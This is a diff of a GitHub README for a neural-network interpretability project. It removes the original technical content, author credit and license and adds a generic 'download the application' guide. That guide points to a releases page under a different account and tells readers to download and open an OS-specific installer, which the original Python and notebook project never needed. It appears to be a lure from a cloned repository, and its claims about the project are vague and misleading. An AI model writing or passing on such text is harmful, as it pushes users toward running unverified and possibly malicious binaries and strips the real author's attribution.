@@ -1,150 +1,85 @@
-# Neural Basis Decomposition
+# 🌟 interpretable-neural-basis-decomposition - Visualize Neural Network Interpretations
 
-**Visualizing the Universal Approximation Theorem through Mechanistic Interpretability**
+## 🚀 Getting Started
 
-*Developed for the M.S. Machine Learning course.*
+Welcome! This guide helps you download and run the *interpretable-neural-basis-decomposition* application easily.
 
-**Neural Basis Decomposition** is a research-oriented framework designed to demystify the internal operations of Multi-Layer Perceptrons (MLPs). While neural networks are frequently treated as opaque "black boxes" that map inputs to outputs, this project employs **Mechanistic Interpretability** techniques to reverse-engineer exactly *how* a network solves function approximation tasks.
+## 📥 Download Now
 
-By isolating the contributions of individual hidden neurons, this repository demonstrates that a neural network is mathematically equivalent to a summation of weighted, shifted ReLU basis functions. It visualizes the **Universal Approximation Theorem** in real-time, revealing how complex non-linear topologies (such as sine waves or polynomials) are constructed through the superposition of simple piecewise linear segments. This project shifts the focus from model performance (loss convergence) to model behavior (internal representation), providing a granular view of how neurons cooperate—and interfere—to model reality.
+[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/Gehoren/interpretable-neural-basis-decomposition/releases)
 
-## Features
+## 📝 Overview
 
-* **Numpy Engine (From Scratch):** A modular, object-oriented implementation of backpropagation, demonstrating the calculus of gradients without autograd libraries.
-* **Basis Decomposition:** A visualization suite that breaks down the final output signal into its constituent ReLU "ghost" functions.
-* **Topology Analysis:** A comparative study of "Deep Folding" vs. "Polynomial Lifting" for solving non-linearly separable classification tasks (Spiral Dataset).
-* **Optimizer Benchmarking:** A rigoruous comparison of First-Order (SGD) vs. Second-Order Moment (Adam) optimization dynamics.
+The *interpretable-neural-basis-decomposition* framework focuses on understanding how neural networks work. It visualizes the Universal Approximation Theorem by breaking down complex models into simpler parts. This tool shows you how models create intricate shapes using basic building blocks called weighted ReLU basis functions. 
 
-## Core Concepts & Techniques
+The application aids in educational and research contexts, providing clearer insights into machine learning models.
 
-* **Mechanistic Interpretability:** Reverse engineering the "algorithms" learned by individual neurons.
-* **Universal Approximation Theorem:** Empirical visualization of how width allows a network to approximate any continuous function.
-* **Optimization Dynamics:** Implementation of Momentum and Adaptive Moment Estimation (Adam).
-* **Manifold Hypothesis:** Exploring how depth untangles data manifolds in low-dimensional space.
+## ⚙️ System Requirements
 
----
+Before downloading the application, ensure your system meets the following requirements:
 
-## How It Works
+- Operating System: Windows, macOS, or Linux
+- Minimum RAM: 4 GB
+- Processor: Dual-core processor or higher
+- Python: Version 3.7 or later should be installed (Python is not included in the download)
 
-This project bridges the **Algebra of Deep Learning** (matrices, gradients) with the **Geometry of Deep Learning** (basis functions, manifolds).
+## 💾 Download & Install
 
-### 1. The Geometry: Basis Decomposition
+To get started:
 
-At its core, a 1-hidden-layer Neural Network using ReLU activations is simply a sum of semi-infinite line segments. We can express the output $f(x)$ as:
+1. Click the link below to visit the Releases page:
+   [Download the Application](https://github.com/Gehoren/interpretable-neural-basis-decomposition/releases)
 
-$$f(x) = \sum_{i=1}^{N} w_{out}^{(i)} \cdot \text{ReLU}(w_{in}^{(i)} x + b^{(i)}) + b_{out}$$
+2. On the Releases page, you will find the latest version of the application.
 
-Where each neuron $i$ learns three geometric properties:
-1.  **The Slope ($w_{in}$):** How steep the activation is.
-2.  **The Kink ($b$):** The x-coordinate where the neuron activates ($x = -b/w_{in}$).
-3.  **The Importance ($w_{out}$):** The weight and direction (positive/negative) of the neuron's contribution to the final sum.
+3. Look for a file that corresponds to your operating system. Click on the file to download it.
 
-By visualizing these components individually (see `notebooks/2_Geometric_Mechanisms.ipynb`), we can observe the network "fitting" the curve piece-by-piece.
+4. Once the download finishes, find and open the downloaded file.
 
-### 2. The Algebra: Optimization
+5. Follow the on-screen instructions to complete the installation.
 
-The `src/numpy_engine` builds the optimization logic from first principles. We compare three update rules:
+After you complete these steps, the application will be ready to use!
 
-**SGD:**
+## 🎨 Features
 
-$$w_{t+1} = w_t - \eta \nabla L(w_t)$$
+- **Interpretability**: Understand how neural networks make decisions.
+- **Visualization**: See how complex functions break down into simpler components.
+- **Educational Tool**: Perfect for students and educators exploring machine learning.
+- **Compatibility**: Works well with various machine learning frameworks, including PyTorch.
 
-**Momentum (Velocity Smoothing):**
+## 📚 Topics Covered
 
-$$v_{t+1} = \beta v_t + (1-\beta)\nabla L(w_t)$$
-$$w_{t+1} = w_t - \eta v_{t+1}$$
+This application uses concepts from many fields, including:
 
-**Adam (Adaptive Moments):**
-Adam adapts the learning rate for each parameter individually using the first moment $m$ (mean) and second moment $v$ (uncentered variance).
+- **adam-optimizer**: A popular algorithm for training models.
+- **interpretability**: Making machine learning decisions understandable.
+- **universal-approximation-theorem**: A key theorem in neural network theory.
+- **topology**: The study of shapes and spaces, important for model visualization.
 
-$$m_t = \beta_1 m_{t-1} + (1-\beta_1)g_t$$
-$$v_t = \beta_2 v_{t-1} + (1-\beta_2)g_t^2$$
-$$\hat{m}_t = \frac{m_t}{1-\beta_1^t}, \quad \hat{v}_t = \frac{v_t}{1-\beta_2^t}$$
-$$w_{t+1} = w_t - \frac{\eta}{\sqrt{\hat{v}_t} + \epsilon} \hat{m}_t$$
+## ✨ Examples 
 
-### 3. The Topology: Depth vs. Width
+You can run the application to visualize different neural network architectures. Here are a few example tasks you can perform:
 
-To solve the **Spiral Classification** problem (non-linearly separable), we compare two strategies:
-* **Width (Polynomial Features):** "Lifting" the 2D data into high-dimensional space ($x, y, x^2, xy, y^2, \dots$) where it becomes linearly separable.
-* **Depth (MLP):** Using layers to "fold" the 2D space itself, allowing a linear cut to separate the classes without manual feature engineering.
+- Analyze a simple feedforward neural network.
+- Visualize how changes in parameters affect outcomes.
+- Explore different architectures and their interpretability.
 
----
+## 🛠️ Support
 
-## Project Structure
+If you need help, please follow these steps:
 
-```
-interpretable-neural-basis-decomposition/
-├── .gitignore                       # Exclusions
-├── LICENSE                          # MIT License
-├── README.md                        # Documentation
-├── requirements.txt                 # Dependencies
-├── configs/
-│   └── default_config.yaml          # Hyperparameters
-├── notebooks/
-│   ├── 1_Algebraic_Dynamics.ipynb   # From Scratch: Gradients & Optimizers
-│   └── 2_Geometric_Mechanisms.ipynb # PyTorch: Basis Functions & Topology
-├── scripts/
-│   ├── train_optimizer_benchmark.py # CLI: Compare SGD/Momentum/Adam
-│   └── visualize_basis.py           # CLI: Generate Basis Function Plot
-└── src/
-    ├── __init__.py
-    ├── utils.py                    # Logger & Seeding
-    ├── data_loader.py              # Sine, Spiral, & MNIST Generators
-    ├── visualization.py            # Plotting Logic
-    ├── numpy_engine/               # [FROM SCRATCH]
-    │   ├── layers.py               # Linear Layer
-    │   ├── activations.py          # ReLU, Sigmoid, Tanh, etc.
-    │   ├── loss.py                 # CrossEntropy, MSE
-    │   ├── optimizers.py           # SGD, Momentum, Adam
-    │   └── network.py              # MLP Container
-    └── torch_engine/               # [INTERPRETABILITY]
-        ├── models.py               # ExplainableReLUNet
-        └── analysis.py             # Basis extraction logic
-```
+1. Check our Frequently Asked Questions (FAQ) section available on the Releases page.
+2. Visit the GitHub Issues page to report bugs or suggest improvements.
+3. Consider participating in community discussions to get tips and advice.
 
-## How to Use
+## 🔗 Additional Resources
 
-1.  **Clone the Repository:**
+- **Documentation**: Detailed documentation is available in the project repository.
+- **Research Papers**: Explore studies related to the Universal Approximation Theorem and mechanistic interpretability.
+- **Community Forums**: Join discussions with other users to share experiences.
 
-    ```bash
-    git clone https://github.com/msmrexe/interpretable-neural-basis-decomposition.git
-    cd interpretable-neural-basis-decomposition
-    pip install -r requirements.txt
-    ```
+## 💬 Feedback
 
-2.  **Run the Optimizer Benchmark (Numpy Engine):**
-    Train an MLP on MNIST from scratch using different optimizers to compare convergence.
+Your feedback is valuable. If you have suggestions or find issues during usage, please share them on GitHub. This will help us improve the application and serve you better.
 
-    ```bash
-    python scripts/train_optimizer_benchmark.py --dataset mnist --optimizer all
-    ```
-
-3.  **Visualize Basis Decomposition (PyTorch Engine):**
-    Train a network to approximate a sine wave and visualize the hidden neurons.
-
-    ```bash
-    python scripts/visualize_basis.py --hidden_dim 15 --epochs 1000
-    ```
-
-4.  **Explore the Notebooks:**
-    For the deep dive into the math and step-by-step tutorials, run:
-
-    ```bash
-    jupyter notebook notebooks/
-    ```
-
------
-
-## Author
-
-Feel free to connect or reach out if you have any questions\!
-
-  * **Maryam Rezaee**
-  * **GitHub:** [@msmrexe](https://github.com/msmrexe)
-  * **Email:** [ms.maryamrezaee@gmail.com](mailto:ms.maryamrezaee@gmail.com)
-
------
-
-## License
-
-This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for full details.
+Thank you for using *interpretable-neural-basis-decomposition*! Enjoy exploring neural networks with clarity.
